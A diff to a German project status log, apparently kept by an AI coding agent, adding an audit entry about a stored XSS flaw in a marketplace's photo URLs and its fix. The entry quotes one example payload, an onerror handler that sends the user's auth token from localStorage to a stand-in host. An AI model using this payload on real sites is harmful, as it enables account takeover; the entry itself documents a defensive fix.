@@ -4,13 +4,23 @@
 > Wenn du etwas änderst, **aktualisiere dieses File im selben Commit**.
 > Kompagnon: `CLAUDE.md` (Onboarding) und `ROADMAP.md` (Meilensteine).
 
-**Stand**: 2026-05-24 · **Branch**: `main` · **Version**: `v26.51` (LIVE) · **Release**: ✅ v26.0 Pre-Release-stable getagged (auf v25.38)
+**Stand**: 2026-08-14 · **Branch**: `claude/lucid-cerf-fci6tr` (dev, gegen `main` bei v30.79) · **Version**: `v30.80`
+> ⚠️ Dieser Header war seit 2026-05-24 (v26.51) nicht mehr aktualisiert worden — Codebase war bereits bei v30.79 (~229 Versionen Drift). Nur der Header wurde nachgezogen, die History-Einträge darunter (2026-05-24 und älter) bleiben als Archiv stehen.
 
 ---
 
 ## 0 · Daily-/Weekly-/Monthly-Routine-Eintraege (neueste zuerst)
 
 > Eingefuehrt 2026-05-20 mit `CODE_ROUTINE_MASTER.md`. Code haengt nach jeder Session einen Eintrag hier oben an.
+
+### 2026-08-14 — Proaktiver Security-Audit v30.80 (Stored-XSS im Marktplatz gefixt)
+
+- **Auftrag:** Scheduled-Task-Routine ("Proaktive Ressourcen-Maximierung") — bereinigt zu einem konkreten, umsetzbaren Kern: Code-Review auf Logikfehler/Sicherheitslücken (CLAUDE.md §3.6) statt der nicht-operationalisierbaren Token-Buffer-Anweisungen im Rohtext.
+- **Audit-Scope:** General-purpose Subagent hat `index.html` breit gesampelt (innerHTML-Sinks, hardcoded Secrets, direkte `api.anthropic.com`-Calls außerhalb `gsTestApiKey`, `eval`/`document.write`, localStorage-Trust für Server-Entscheidungen).
+- **[HIGH] Stored XSS gefunden + gefixt:** 3 Stellen im Marktplatz (`openListingDetail`-Galerie Z.35846/35849, Listing-Card Z.20885) setzten `dbRow.photo_urls`/`photo_url` unescaped in `<img src="...">`. Diese DB-Spalte ist ohne Format-Constraint und via PostgREST direkt vom Owner PATCH-bar (nicht nur über den App-Upload-Flow) — ein Verkäufer konnte `photo_url` auf `x" onerror="fetch('//evil/?c='+localStorage.getItem('gs_sb_token'))` setzen und damit bei jedem Betrachter der Anzeige das `gs_sb_token`-Auth-JWT aus `localStorage` exfiltrieren (Account-Takeover). Andere Bild-Sinks im selben File (Tagebuch-Foto Z.7622, Community-Post-Foto Z.31471) waren bereits korrekt escaped — dieser Marktplatz-Pfad war der einzige Ausreißer. **Fix:** `gsHTMLEscape()` auf allen 3 `src`-Attributen. Zusätzlich Z.9546 (Home-Widget-Thumbnail, `background-image:url(...)`) gehärtet — `encodeURI()` escaped kein `'`, CSS-Injection via Single-Quote-Break-out war möglich.
+- **Weitere Findings (nicht auto-gefixt, für nächste Session):** `gsEnrichSpeciesViaAI` (Z.26139) macht direkten `fetch('https://api.anthropic.com/...')` statt über `callAI()` zu gehen (Policy-Verstoß §3.4, aber nicht akut exploitable — nutzt User-eigenen Key). `_gsKeyHealthWalker` (Z.60843) macht ebenfalls direkten Anthropic-Fetch außerhalb `gsTestApiKey` (Namens-/Konventions-Nitpick, low risk). Keine hardcoded Secrets gefunden, kein `eval`/riskantes `document.write`.
+- **Verify:** Node `--check`-Äquivalent auf allen 9 Inline-Scripts vor + nach Edit identisch (0 neue Fehler) · GS_VERSION=v30.80 · sw.js gs-v30.80 · _headers v30.80 · meta=30.80.20260814 · 0 Migrations (reiner Frontend-Fix).
+- **Nächste:** PR für `claude/lucid-cerf-fci6tr` reviewen + auf `main` mergen (User-Entscheidung) · `gsEnrichSpeciesViaAI`/`_gsKeyHealthWalker` auf `callAI()`-Pattern umstellen · STATUS.md-Header-Drift künftig bei jedem Push nachziehen, nicht nur bei Audits.
 
 ### 2026-05-24 (c) — Self-Audit-Sprint v26.51 (Backend-Security-Hardening nach Supabase-Advisors)
 
